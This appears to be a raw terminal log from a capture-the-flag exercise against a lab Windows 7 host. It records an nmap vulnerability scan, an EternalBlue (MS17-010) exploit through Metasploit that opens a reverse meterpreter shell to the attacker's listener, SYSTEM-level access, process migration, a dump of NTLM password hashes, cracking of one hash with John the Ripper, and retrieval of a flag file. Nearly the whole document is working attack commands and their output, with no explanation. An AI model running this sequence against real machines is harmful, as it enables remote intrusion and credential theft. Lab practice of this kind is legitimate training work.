@@ -1,0 +1,491 @@
+nmap -sV -vv --script vuln 10.10.174.192
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-26 12:45 EDT
+NSE: Loaded 149 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 12:45
+Completed NSE at 12:45, 10.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 12:45
+Completed NSE at 12:45, 0.00s elapsed
+Initiating Ping Scan at 12:45
+Scanning 10.10.174.192 [2 ports]
+Completed Ping Scan at 12:45, 0.08s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 12:45
+Completed Parallel DNS resolution of 1 host. at 12:45, 6.51s elapsed
+Initiating Connect Scan at 12:45
+Scanning 10.10.174.192 (10.10.174.192) [1000 ports]
+Discovered open port 139/tcp on 10.10.174.192
+Discovered open port 445/tcp on 10.10.174.192
+Discovered open port 135/tcp on 10.10.174.192
+Discovered open port 3389/tcp on 10.10.174.192
+Discovered open port 49158/tcp on 10.10.174.192
+Discovered open port 49153/tcp on 10.10.174.192
+Discovered open port 49160/tcp on 10.10.174.192
+Discovered open port 49152/tcp on 10.10.174.192
+Discovered open port 49154/tcp on 10.10.174.192
+Completed Connect Scan at 12:45, 2.70s elapsed (1000 total ports)
+Initiating Service scan at 12:45
+Scanning 9 services on 10.10.174.192 (10.10.174.192)
+Service scan Timing: About 44.44% done; ETC: 12:47 (0:01:09 remaining)
+Completed Service scan at 12:47, 88.43s elapsed (9 services on 1 host)
+NSE: Script scanning 10.10.174.192.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 12:47
+NSE: [firewall-bypass 10.10.174.192] lacks privileges.
+NSE Timing: About 99.91% done; ETC: 12:47 (0:00:00 remaining)
+NSE Timing: About 99.91% done; ETC: 12:48 (0:00:00 remaining)
+Completed NSE at 12:48, 60.41s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 12:48
+NSE: [tls-ticketbleed 10.10.174.192:445] Not running due to lack of privileges.
+NSE: [ssl-ccs-injection 10.10.174.192:3389] No response from server: ERROR
+Completed NSE at 12:48, 2.72s elapsed
+Nmap scan report for 10.10.174.192 (10.10.174.192)
+Host is up, received conn-refused (0.079s latency).
+Scanned at 2023-08-26 12:45:32 EDT for 154s
+Not shown: 991 closed tcp ports (conn-refused)
+PORT      STATE SERVICE            REASON  VERSION
+135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server? syn-ack
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 12:48
+Completed NSE at 12:48, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 12:48
+Completed NSE at 12:48, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 171.39 seconds
+
+
+----------------------------------------------------------------------------
+msfconsole  //I started metasploit
+
+search ms17-010
+
+msf6 > search ms17-010
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
+
+msf6 > use 0
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Wind
+                                             ows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows
+                                             Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded S
+                                             tandard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.13     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.174.192
+RHOSTS => 10.10.174.192
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.8.113.244
+LHOST => 10.8.113.244
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+
+[*] Started reverse TCP handler on 10.8.113.244:4444 
+[*] 10.10.174.192:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.174.192:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.174.192:445     - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.174.192:445 - The target is vulnerable.
+[*] 10.10.174.192:445 - Connecting to target for exploitation.
+[+] 10.10.174.192:445 - Connection established for exploitation.
+[+] 10.10.174.192:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.174.192:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.174.192:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.174.192:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.174.192:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.174.192:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.174.192:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.174.192:445 - Sending all but last fragment of exploit packet
+[*] 10.10.174.192:445 - Starting non-paged pool grooming
+[+] 10.10.174.192:445 - Sending SMBv2 buffers
+[+] 10.10.174.192:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.174.192:445 - Sending final SMBv2 buffers.
+[*] 10.10.174.192:445 - Sending last fragment of exploit packet!
+[*] 10.10.174.192:445 - Receiving response from exploit packet
+[+] 10.10.174.192:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.174.192:445 - Sending egg to corrupted connection.
+[*] 10.10.174.192:445 - Triggering free of corrupted buffer.
+[*] Sending stage (200774 bytes) to 10.10.174.192
+[*] Meterpreter session 1 opened (10.8.113.244:4444 -> 10.10.174.192:49173) at 2023-08-26 12:49:05 -0400
+[+] 10.10.174.192:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.174.192:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.174.192:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+------------------------------------------------------------------------------------------------------------------
+meterpreter > shell
+Process 2080 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+------------------------------------------------------------------------------------------------------------------
+
+C:\Windows\system32>^Z
+Background channel 1? [y/N]  y
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                x64   0
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 540   532   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 556   640   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 580   640   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 588   532   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 616   580   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 640   588   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 664   588   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 672   588   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 696   580   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 824   640   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 860   824   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\wmiprvse.exe
+ 896   640   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 944   640   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1012  696   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 1076  640   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1176  640   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1304  640   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1340  640   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1376  824   WmiPrvSE.exe
+ 1400  640   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1476  640   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 1588  640   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1876  640   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2080  1304  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
+ 2096  540   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 2340  580   WMIADAP.exe           x64   0        NT AUTHORITY\SYSTEM           \\?\C:\Windows\system32\wbem\WMIADAP.EXE
+ 2592  640   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
+ 2860  640   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+ 2892  640   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 2920  640   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2956  640   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 3044  640   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
+----------------------------------------------------------------------------------------------------------------------------------------------
+
+migrate 824
+[*] Migrating from 640 to 824...
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50: warning: Exception in finalizer #<Proc:0x00007f774dae4a18 /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339>
+/usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:90:in `synchronize': can't be called from trap context (ThreadError)
+        from /usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:90:in `log'
+        from /usr/share/metasploit-framework/lib/rex/logging/log_dispatcher.rb:172:in `elog'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:343:in `rescue in block in finalize'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:340:in `block in finalize'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50:in `split'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50:in `block in init_x8664_only'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:44:in `delete_if'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:44:in `init_x8664_only'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:71:in `init_sse3'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1102:in `init_ssse3'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1107:in `init_sse41'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1112:in `init_sse42'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1117:in `init_avx'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1122:in `init_avx2'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1128:in `init_all'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/main.rb:236:in `init_opcode_list'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/main.rb:28:in `opcode_list'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/main.rb:42:in `opcode_list_byname'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:71:in `parse_instruction_mnemonic'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:31:in `parse_instruction'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:339:in `parse'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/exe_format/shellcode.rb:69:in `assemble'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/exe_format/main.rb:94:in `assemble'
+        from /usr/share/metasploit-framework/lib/msf/core/payload/windows/x64/meterpreter_loader_x64.rb:112:in `stage_meterpreter'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:943:in `generate_migrate_windows_payload'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:952:in `generate_migrate_payload'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:629:in `migrate'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1254:in `cmd_migrate'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:163:in `run'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact'
+        from /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:565:in `_interact'
+        from /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact'
+        from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1682:in `cmd_sessions'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
+        from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:192:in `cmd_exploit'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:168:in `run'
+        from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
+        from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+        from /usr/bin/msfconsole:23:in `<main>'
+/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `synchronize': can't be called from trap context (ThreadError)
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `send_packet'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:368:in `close'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:341:in `block in finalize'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50:in `split'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50:in `block in init_x8664_only'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:44:in `delete_if'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:44:in `init_x8664_only'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:71:in `init_sse3'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1102:in `init_ssse3'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1107:in `init_sse41'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1112:in `init_sse42'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1117:in `init_avx'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1122:in `init_avx2'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1128:in `init_all'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/main.rb:236:in `init_opcode_list'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/main.rb:28:in `opcode_list'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/main.rb:42:in `opcode_list_byname'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:71:in `parse_instruction_mnemonic'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:31:in `parse_instruction'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:339:in `parse'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/exe_format/shellcode.rb:69:in `assemble'
+        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/exe_format/main.rb:94:in `assemble'
+        from /usr/share/metasploit-framework/lib/msf/core/payload/windows/x64/meterpreter_loader_x64.rb:112:in `stage_meterpreter'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:943:in `generate_migrate_windows_payload'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:952:in `generate_migrate_payload'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:629:in `migrate'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1254:in `cmd_migrate'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:163:in `run'
+        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact'
+        from /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:565:in `_interact'
+        from /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact'
+        from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1682:in `cmd_sessions'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
+        from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:192:in `cmd_exploit'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
+        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:168:in `run'
+        from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
+        from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+        from /usr/bin/msfconsole:23:in `<main>'
+[*] Migration completed successfully.
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+ohn --format=NT --wordlist=/usr/share/wordlists/rockyou.txt password    
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alqfna22         (?)     
+1g 0:00:00:00 DONE (2023-08-26 13:16) 1.149g/s 11724Kp/s 11724Kc/s 11724KC/s alqui..alpusidi
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed. 
+--------------------------------------------------------------------------------------------------
+
+meterpreter > pwd
+C:\Windows\system32
+meterpreter > cd ..
+meterpreter > pwd
+C:\Windows
+meterpreter > cd ..
+meterpreter > ls
+Listing: C:\
+============
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+040777/rwxrwxrwx  0      dir   2018-12-12 22:13:36 -0500  $Recycle.Bin
+040777/rwxrwxrwx  0      dir   2009-07-14 01:08:56 -0400  Documents and Settings
+040777/rwxrwxrwx  0      dir   2009-07-13 23:20:08 -0400  PerfLogs
+040555/r-xr-xr-x  4096   dir   2019-03-17 18:22:01 -0400  Program Files
+040555/r-xr-xr-x  4096   dir   2019-03-17 18:28:38 -0400  Program Files (x86)
+040777/rwxrwxrwx  4096   dir   2019-03-17 18:35:57 -0400  ProgramData
+040777/rwxrwxrwx  0      dir   2018-12-12 22:13:22 -0500  Recovery
+040777/rwxrwxrwx  4096   dir   2019-03-17 18:35:55 -0400  System Volume Information
+040555/r-xr-xr-x  4096   dir   2018-12-12 22:13:28 -0500  Users
+040777/rwxrwxrwx  16384  dir   2023-08-26 12:56:53 -0400  Windows
+100666/rw-rw-rw-  24     fil   2019-03-17 15:27:21 -0400  flag1.txt
+000000/---------  0      fif   1969-12-31 19:00:00 -0500  hiberfil.sys
+000000/---------  0      fif   1969-12-31 19:00:00 -0500  pagefile.sys
+
+meterpreter > cat flag1.txt 
+flag{access_the_machine}meterpreter > 
+------------------------------------------------------------------------------------------------
+
+meterpreter > cd Windows\\
+meterpreter > cd System32\\
+meterpreter > cd config
+[-] stdapi_fs_chdir: Operation failed: 1113
+meterpreter > cd config
+meterpreter > ls
+Listing: C:\Windows\System32\config
+===================================
+
+Mode              Size      Type  Last modified              Name
+----              ----      ----  -------------              ----
+100666/rw-rw-rw-  28672     fil   2018-12-12 18:00:40 -0500  BCD-Template
+100666/rw-rw-rw-  25600     fil   2018-12-12 18:00:40 -0500  BCD-Template.LOG
+100666/rw-rw-rw-  18087936  fil   2023-08-26 13:07:30 -0400  COMPONENTS
+100666/rw-rw-rw-  1024      fil   2011-04-12 04:32:10 -0400  COMPONENTS.LOG
+100666/rw-rw-rw-  13312     fil   2023-08-26 13:07:30 -0400  COMPONENTS.LOG1
